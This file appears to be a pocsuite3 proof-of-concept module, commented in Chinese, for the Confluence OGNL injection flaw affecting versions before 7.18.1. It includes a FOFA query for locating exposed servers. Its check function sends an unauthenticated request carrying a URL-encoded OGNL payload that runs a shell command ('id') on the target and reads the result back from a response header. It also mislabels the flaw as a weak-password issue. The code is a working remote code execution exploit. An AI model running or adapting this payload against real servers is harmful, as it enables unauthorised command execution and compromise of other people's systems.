from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
import urllib3
urllib3.disable_warnings()

class AtlassianConfluence(POCBase):
    # fofa语句: app="ATLASSIAN-Confluence"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2022-06-04"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-06-04"  # 编写 PoC 的日期
    updateDate = "2022-06-04"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"]  # 漏洞地址来源,0day不用写
    name = "Atlassian Confluence OGNL 注入漏洞"  # PoC 名称
    appPowerLink = "https://confluence.atlassian.com"  # 漏洞厂商主页地址
    appName = "Atlassian Confluence OGNL 注入漏洞"  # 漏洞应用名称
    appVersion = "Atlassian Confluence < 7.18.1"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """利用影响 Atlassian Confluence 产品 7.18.1 及更低版本的远程代码执行漏洞的脚本 PoC。OGNL 注入漏洞允许未经身份验证的用户在 Confluence 服务器或数据中心实例上执行任意代码。"""  # 漏洞简要描述
    # pocDesc = """"""  # POC用法描述

    def _check(self):
        url = self.url.strip()
        result = []
        command = "id"
        try:
            # response = requests.get("{}/login.action".format(url), verify=False)
            # if response.status_code == 200:
                # filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
                # if (len(filter_version) >= 1):
                #     version = filter_version[0].split("'>")[1].split('</')[0]
                #     return version
                # else:
                #     return False
            response = requests.get(
                "{}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(
                    url, command), verify=False, allow_redirects=False,timeout=5)

            if (response.status_code == 302) and "uid=" in response.headers['X-Cmd-Response']:
                result.append(url)
                return result

        except Exception as e:
            print(e)
        finally:
            return result


    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(AtlassianConfluence)
